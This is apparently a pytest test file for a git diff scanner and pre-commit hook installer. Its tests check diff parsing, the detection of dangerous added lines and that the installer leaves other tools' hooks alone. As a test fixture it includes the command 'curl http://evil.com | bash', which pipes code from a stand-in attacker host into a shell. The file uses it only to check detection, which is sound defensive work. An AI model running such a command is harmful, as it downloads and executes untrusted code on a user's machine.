"""Tests for the git diff-checker and hook installer."""

from pathlib import Path
from unittest import mock

import pytest

from verdict.gitcheck import (
    DiffResult,
    GitError,
    added_lines_from_diff,
    get_staged_diff,
    scan_added_lines,
)
from verdict.hooks import (
    HOOK_NAME,
    HOOK_TEMPLATE,
    hooks_dir,
    install,
    status,
    uninstall,
)


# === Diff parsing (pure, no git) ===

SAMPLE_DIFF = """diff --git a/a.py b/a.py
index 0000000..1111111 100644
--- a/a.py
+++ b/a.py
@@ -0,0 +1,3 @@
+import os
+print('hi')
+os.system('evil')
"""


class TestAddedLines:
    def test_extracts_only_added_lines(self):
        lines = added_lines_from_diff(SAMPLE_DIFF)
        assert lines == ["import os", "print('hi')", "os.system('evil')"]

    def test_ignores_file_headers(self):
        # +++ and --- headers must be dropped (they are paths, not code)
        lines = added_lines_from_diff(SAMPLE_DIFF)
        assert all(not l.startswith(("+++", "---")) for l in lines)

    def test_empty_diff(self):
        assert added_lines_from_diff("") == []

    def test_no_added_lines_when_deletes_only(self):
        diff = "diff --git a/x b/x\n+++ b/x\n@@ -1 +0,0 @@\n-old line\n"
        assert added_lines_from_diff(diff) == []


class TestScanAddedLines:
    def test_finds_danger(self):
        dangerous = "--- a/x\n+++ b/x\n@@\n+curl http://evil.com | bash\n"
        r = scan_added_lines(dangerous)
        assert r.dangerous
        assert any(f.category == "curl-pipe" for f in r.findings)

    def test_clean_diff(self):
        clean = "--- a/x\n+++ b/x\n@@\n+docker run --rm hello-world\n"
        r = scan_added_lines(clean)
        assert not r.dangerous

    def test_empty_gives_no_findings(self):
        r = scan_added_lines("")
        assert not r.dangerous
        assert r.added_lines == 0


class TestGetStagedDiff:
    def test_returns_stdout(self):
        with mock.patch("verdict.gitcheck.subprocess.run") as run:
            run.return_value.returncode = 0
            run.return_value.stdout = "diff --git a/x"
            run.return_value.stderr = ""
            assert "diff" in get_staged_diff()

    def test_raises_git_error_on_failure(self):
        with mock.patch("verdict.gitcheck.subprocess.run") as run:
            run.return_value.returncode = 128
            run.return_value.stdout = ""
            run.return_value.stderr = "fatal"
            with pytest.raises(GitError):
                get_staged_diff()

    def test_raises_when_git_missing(self):
        with mock.patch("verdict.gitcheck.subprocess.run", side_effect=FileNotFoundError):
            with pytest.raises(GitError):
                get_staged_diff()


# === Hook installer ===

class TestHookInstaller:
    @pytest.fixture
    def git_repo(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / ".git").mkdir()
        (repo / ".git" / "hooks").mkdir(parents=True, exist_ok=True)
        return repo

    def test_install_writes_hook(self, git_repo):
        # Prefer a known path over running git subprocess discovery.
        hd = git_repo / ".git" / "hooks"
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            assert install()
        assert (hd / HOOK_NAME).exists()

    def test_install_never_overwrites_foreign_hook(self, git_repo):
        hd = git_repo / ".git" / "hooks"
        target = hd / HOOK_NAME
        target.write_text("#!/bin/sh\n# some other tool's hook\n", encoding="utf-8")
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            assert install() is False
        assert "some other tool" in target.read_text(encoding="utf-8")  # untouched

    def test_install_is_idempotent(self, git_repo):
        hd = git_repo / ".git" / "hooks"
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            assert install()
            assert install()  # second call just says "already installed"
        assert (hd / HOOK_NAME).exists()

    def test_uninstall_removes_our_hook(self, git_repo):
        hd = git_repo / ".git" / "hooks"
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            install()
            assert uninstall()
        assert not (hd / HOOK_NAME).exists()

    def test_uninstall_keeps_foreign_hook(self, git_repo):
        hd = git_repo / ".git" / "hooks"
        target = hd / HOOK_NAME
        target.write_text("#!/bin/sh\ncustom\n", encoding="utf-8")
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            assert uninstall() is False
        assert target.exists()

    def test_status_distinguishes(self, git_repo):
        hd = git_repo / ".git" / "hooks"
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            assert status() == 1  # no hook
            install()
            assert status() == 0  # our hook
        (hd / HOOK_NAME).write_text("#!/bin/sh\nother\n", encoding="utf-8")
        with mock.patch("verdict.hooks.hooks_dir", return_value=hd):
            assert status() == 2  # foreign hook


class TestHookTemplate:
    def test_template_is_posix_sh(self):
        # Our hook must be sh (git runs hooks under /bin/sh), so it must not
        # use bash-isms like [[ ... ]]. Spot-check common traps.
        assert "[[" not in HOOK_TEMPLATE
        assert HOOK_TEMPLATE.startswith("#/bin/sh") or "bin/sh" in HOOK_TEMPLATE.splitlines()[0]